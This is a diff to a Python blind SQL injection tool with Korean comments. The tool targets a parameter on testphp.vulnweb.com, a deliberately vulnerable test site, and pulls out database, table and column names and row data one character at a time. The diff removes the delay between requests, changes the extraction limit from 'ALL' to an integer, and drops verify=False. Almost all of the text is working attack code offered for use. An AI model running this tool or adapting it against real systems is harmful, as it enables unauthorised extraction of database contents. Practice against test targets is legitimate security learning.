@@ -9,7 +9,7 @@ import time
 url = "http://testphp.vulnweb.com/artists.php"  # 대상 URL
 param_name = "artist"  # 공격할 파라미터 이름
 true_response_indicator = "r4w8173"  # 참일 때 나타나는 응답 키워드
-sleep_time = 1.0  # 요청 간 지연 시간 (초)
+sleep_time = 0  # 요청 간 지연 시간 (초)
 
 # SQL Injection 페이로드 템플릿 설정
 payload_templates = {
@@ -88,10 +88,10 @@ def get_database_name():
     return db_name
 
 # 테이블 이름 추출 함수
-def get_table_names(limit="ALL"):
+def get_table_names(limit=0):
     tables = []
     print("[정보] 데이터베이스의 테이블 이름을 찾고 있습니다...")
-    for index in range(0, 100 if limit == "ALL" else limit):  # 최대 100개 테이블 또는 사용자 지정 개수
+    for index in range(0, limit or 100):  # 최대 100개 테이블 또는 사용자 지정 개수
         table_name = ""
         for i in range(1, 50):  # 최대 테이블 이름 길이 50자 가정
             found_char = False
@@ -117,10 +117,10 @@ def get_table_names(limit="ALL"):
     return tables
 
 # 컬럼 이름 추출 함수
-def get_column_names(table_name, limit="ALL"):
+def get_column_names(table_name, limit=0):
     columns = []
     print(f"[정보] '{table_name}' 테이블의 컬럼명을 찾고 있습니다...")
-    for index in range(0, 100 if limit == "ALL" else limit):  # 최대 100개 컬럼 또는 사용자 지정 개수
+    for index in range(0, limit or 100):  # 최대 100개 컬럼 또는 사용자 지정 개수
         column_name = ""
         for i in range(1, 50):  # 최대 컬럼 이름 길이 50자 가정
             found_char = False
@@ -146,11 +146,11 @@ def get_column_names(table_name, limit="ALL"):
     return columns
 
 # 특정 테이블 컬럼의 데이터 추출 함수
-def get_column_data(table_name, column_name, limit="ALL"):
+def get_column_data(table_name, column_name, limit=0):
     data = []
     print(f"[정보] '{table_name}' 테이블의 '{column_name}' 컬럼 데이터를 찾고 있습니다...")
 
-    for index in range(0, 100 if limit == "ALL" else limit):  # 최대 100개 데이터 행 또는 사용자 지정 개수
+    for index in range(0, limit or 100):  # 최대 100개 데이터 행 또는 사용자 지정 개수
         row_data = ""
         for i in range(1, 50):  # 데이터 길이 최대 50자 가정
             found_char = False
@@ -176,7 +176,7 @@ def get_column_data(table_name, column_name, limit="ALL"):
     return data
 
 # 모든 컬럼 데이터 추출 함수
-def get_all_column_data(table_name, limit="ALL"):
+def get_all_column_data(table_name, limit=0):
     columns = get_column_names(table_name)  # 해당 테이블의 모든 컬럼명을 추출
     all_data = {}
 
@@ -189,9 +189,9 @@ def get_all_column_data(table_name, limit="ALL"):
 # 요청 전송 함수
 def send_request(params):
     if request_method == "POST":
-        return requests.post(url, data=params, timeout=10, verify=False)
+        return requests.post(url, data=params, timeout=10)
     elif request_method == "GET":
-        return requests.get(url, params=params, timeout=10, verify=False)
+        return requests.get(url, params=params, timeout=10)
     else:
         raise ValueError("잘못된 요청 방식입니다. GET 또는 POST만 가능합니다.")
 
@@ -217,18 +217,18 @@ def main():
             db_name = get_database_name()
             ask_to_save({"Database Name": [db_name]}, "database_name")
         elif choice == "2":
-            limit = input("추출할 테이블 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
+            limit = int(input("추출할 테이블 개수를 입력하세요 (0 입력 시 전체 추출): "))
             tables = get_table_names(limit)
             ask_to_save({"Table Names": tables}, "tables")
         elif choice == "3":
             table_name = input("컬럼을 가져올 테이블 이름을 입력하세요: ")
-            limit = input("추출할 컬럼 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
+            limit = int(input("추출할 컬럼 개수를 입력하세요 (0 입력 시 전체 추출): "))
             columns = get_column_names(table_name, limit)
             ask_to_save({"Column Names": columns}, f"{table_name}_columns")
         elif choice == "4":
             table_name = input("데이터를 가져올 테이블 이름을 입력하세요: ")
             column_name = input("데이터를 가져올 컬럼 이름을 입력하세요 (ALL 입력 시 모든 컬럼의 데이터 추출): ")
-            limit = input("추출할 데이터 개수를 입력하세요 (ALL 입력 시 전체 추출): ").strip().upper()
+            limit = int(input("추출할 데이터 개수를 입력하세요 (0 입력 시 전체 추출): "))
             
             if column_name.upper() == "ALL":
                 data = get_all_column_data(table_name, limit)
